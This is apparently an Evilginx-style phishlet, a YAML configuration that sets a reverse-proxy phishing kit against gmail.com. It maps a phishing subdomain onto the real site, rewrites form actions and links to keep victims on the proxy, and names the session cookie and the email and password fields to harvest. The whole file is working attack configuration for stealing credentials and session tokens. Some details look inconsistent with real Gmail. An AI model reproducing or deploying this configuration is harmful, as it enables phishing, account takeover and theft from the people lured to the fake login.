name: 'gmail' 
author: '@mrsoft' 
min_ver: '2.1.0' 
proxy_hosts: 
 - {phish_sub: 'www', orig_sub: 'www', domain: 'gmail.com', session: true, is_landing: true} 
sub_filters: 
 - {hostname: 'www.gmail.com', sub: 'www', domain: 'gmail.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']} 
 - {hostname: 'www.gmail.com', sub: 'www', domain: 'gmail.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']} 
 - {hostname: 'www.gmail.com', sub: 'www', domain: 'gmail.com', search: '//{hostname}/ex/', replace: '//{hostname}/ex/', mimes: ['text/html', 'application/json']} 
auth_urls: 
 - '/ex/' 
auth_tokens: 
 - domain: 'www.gmail.com' 
   keys: ['PHPSESSID'] 
user_regex: 
 key: 'email' 
 re: '(.*)' 
pass_regex: 
 key: 'password' 
 re: '(.*)' 
landing_path: 
 - '/login/'
